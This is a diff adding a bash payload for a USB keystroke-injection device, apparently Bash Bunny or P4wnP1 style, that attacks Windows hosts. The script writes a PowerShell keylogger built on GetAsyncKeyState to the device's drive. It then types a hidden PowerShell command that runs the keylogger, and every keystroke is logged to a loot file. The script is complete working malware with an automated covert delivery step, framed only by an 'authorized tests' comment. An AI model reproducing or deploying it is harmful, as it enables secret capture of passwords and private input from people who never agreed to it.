@@ -1,0 +1,35 @@
+#!/bin/bash
+# keylogger (Windows host, HID+STORAGE, authorized tests only).
+# The pi plants keylogger.ps1 on its USB drive, then injects a single command
+# that runs it hidden. Keystrokes append to E:\loot\keys.txt until logoff.
+# Modify aggressively before you use it; it is a literal keylogger.
+LED SETUP
+ATTACKMODE HID STORAGE
+sleep 3
+mkdir -p /root/udisk/loot
+cat > /root/udisk/keylogger.ps1 <<'PSEOF'
+$sig = '[DllImport("user32.dll")] public static extern int GetAsyncKeyState(int v);'
+$K = Add-Type -MemberDefinition $sig -Name K -Passthru
+$log = 'E:\loot\keys.txt'
+while (1) {
+  Start-Sleep -Milliseconds 30
+  for ($i = 0; $i -lt 256; $i++) {
+    if ($K::GetAsyncKeyState($i) -band 0x8000) {
+      "{0} {1}" -f [DateTime]::Now, [char]$i | Out-File -Append $log
+    }
+  }
+}
+PSEOF
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM start keylogger" \
+    "DEFAULT_DELAY 40" \
+    "GUI r" "DELAY 400" \
+    "STRING powershell -NoP -W Hidden -File E:\\keylogger.ps1" "ENTER"
+echo "[+] keylogger.ps1 planted on drive and launched"
+echo "    keystrokes land on the host at E:\\loot\\keys.txt (until logoff)"
+LED FINISH
+exit 0
